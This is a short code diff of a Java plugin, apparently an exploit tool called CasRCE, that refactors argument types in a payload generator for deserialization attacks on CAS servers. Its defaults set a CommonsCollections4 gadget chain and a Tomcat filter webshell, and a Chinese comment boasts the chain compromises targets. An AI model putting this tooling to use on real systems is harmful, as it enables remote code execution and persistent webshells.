@@ -15,14 +15,14 @@ public class CasPayloadGenerate implements IPayloadGenerator {
     @Override
     public IArgsUsageBinder getPayloadCustomArgs() {
         IArgsUsageBinder binder = CasRCE.callbacks.getPluginHelper().createArgsUsageBinder();
-        List<IArgs> args = new ArrayList<>();
-        final IArgs gadge = CasRCE.callbacks.getPluginHelper().createArgs();
+        List<IArg> args = new ArrayList<>();
+        final IArg gadge = CasRCE.callbacks.getPluginHelper().createArg();
         gadge.setName("gadge");
         gadge.setDefaultValue("CommonsCollections4");
         gadge.setRequired(true);
         gadge.setDescription("cc链，默认用cc4就能打死");
 
-        final IArgs shellType = CasRCE.callbacks.getPluginHelper().createArgs();
+        final IArg shellType = CasRCE.callbacks.getPluginHelper().createArg();
         shellType.setName("command");
         shellType.setDefaultValue("TomcatFilterWebshell");
         gadge.setRequired(true);
@@ -36,10 +36,10 @@ public class CasPayloadGenerate implements IPayloadGenerator {
     }
 
     @Override
-    public void generatorPayload(Map<String, String> customArgs, IResultOutput result) {
+    public void generatorPayload(Map<String, Object> customArgs, IResultOutput result) {
         iResultOutput = result;
-        String className = customArgs.get("gadge");
-        String command = customArgs.get("command");
+        String className = (String)customArgs.get("gadge");
+        String command = (String)customArgs.get("command");
 
         result.successPrintln(String.format("gadget: %s command: %s",className,command));
         result.rawPrintln("\n");
